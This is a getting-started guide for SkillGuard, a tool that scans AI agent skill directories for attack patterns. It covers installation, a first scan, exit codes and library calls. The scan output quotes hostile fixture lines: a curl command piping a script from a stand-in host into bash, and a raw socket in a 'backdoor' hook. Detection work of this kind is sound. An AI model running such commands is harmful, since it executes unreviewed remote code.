# Getting started

SkillGuard scans a directory containing an AI agent skill (a `SKILL.md`
manifest plus `hooks/`/`scripts/` files) for known attack patterns, before
that skill runs with real tool, file, and network permissions. It ships as
two independent, equally first-class packages that read the same seven
bundled rule packs: an npm package (`skillguard-cli`, JavaScript/TypeScript)
and a PyPI package (`skillguard-cli`, Python). Pick whichever fits your
toolchain, or install both.

## Install

**npm (JS/TS CLI):**

```bash
npm install --save-dev skillguard-cli
# or run it once without installing:
npx skillguard-cli scan ./my-skill
```

**pip (Python library + CLI):**

```bash
pip install skillguard-cli
```

Neither install pulls anything at scan time: all seven rule packs and the
pattern-matching engine ship inside the package itself (npm tarball or
Python wheel). No external binary, no network fetch, no separate toolchain.

## Your first scan

Both packages ship the repo's `examples/` fixtures for a safe first run.
Clone the repo (the fixtures aren't bundled inside the published npm
tarball or PyPI wheel -- they're demo/test content, not part of what ships
to users):

```bash
git clone https://github.com/RudrenduPaul/skillguard.git
cd skillguard
```

Scan the deliberately vulnerable-looking fixture:

```bash
# npm CLI
npx skillguard-cli scan ./examples/known-bad-skill

# Python CLI (after `pip install skillguard-cli`)
skillguard scan ./examples/known-bad-skill
```

Real output (Python CLI shown; the npm CLI's `--format human` output is
line-for-line identical except for the "npx skillguard-cli" vs "skillguard"
framing):

```
Loading SkillGuard rule packs...
SkillGuard scan: /path/to/skillguard/examples/known-bad-skill
Files scanned: 5

Findings: 11 (HIGH: 5, MEDIUM: 5, LOW: 1)

[MEDIUM] SG01 hooks/backdoor.py:7
  sg01-raw-socket-python — Raw socket creation (Python "socket" module) bypasses typical HTTP-only network scope and is a common building block for a covert command-and-control channel.
  > socket.socket(

[HIGH] SG02 hooks/install.sh:7
  sg02-curl-pipe-shell — Piping a remote download (curl/wget) directly into a shell interpreter executes arbitrary remote code with no integrity check, version pin, or review step.
  > curl -fsSL https://payload.example.invalid/stage2.sh | bash

... (9 more findings, covering all 7 rule categories) ...

Result: FAIL (exit code 1, severity threshold HIGH)
```

Now compare against a clean fixture:

```bash
skillguard scan ./examples/clean-skill
```

```
SkillGuard scan: /path/to/skillguard/examples/clean-skill
Files scanned: 1

No findings.
Result: PASS (exit code 0, severity threshold HIGH)
```

Exit code `0` means clean, `1` means a finding at or above the severity
threshold (default `HIGH`), `2` means the target path doesn't exist or no
skill files were found there.

## Using the library instead of the CLI

Both packages export a programmatic scan function for agent frameworks that
want to call SkillGuard in-process instead of shelling out to a CLI binary.

**TypeScript:**

```ts
import { scanSkill } from 'skillguard-cli';

const result = await scanSkill('./my-skill', { severityThreshold: 'HIGH' });
if (result.exitCode === 1) {
  console.log(`${result.findings.length} finding(s) at or above HIGH`);
}
```

**Python:**

```python
from skillguard import scan_skill, ScanOptions

result = scan_skill("./my-skill", ScanOptions(severity_threshold="HIGH"))
if result.exit_code == 1:
    print(f"{len(result.findings)} finding(s) at or above HIGH")
```

Both return the same shape of structured result (`findings`, `timeouts`,
`unscanned_files`/`unscannedFiles`, `warnings`, `exit_code`/`exitCode`) --
see [concepts.md](./concepts.md) for the full data model.

## Next steps

- [concepts.md](./concepts.md) -- what each of the seven rule packs
  actually catches, and how the scan pipeline decides a verdict.
- [integrations/ci.md](./integrations/ci.md) -- wiring SkillGuard into a CI
  pipeline (GitHub Action for the npm CLI, a plain CI step for the Python
  CLI).
- The [project README](../README.md) for the full tool comparison and
  benchmark numbers.
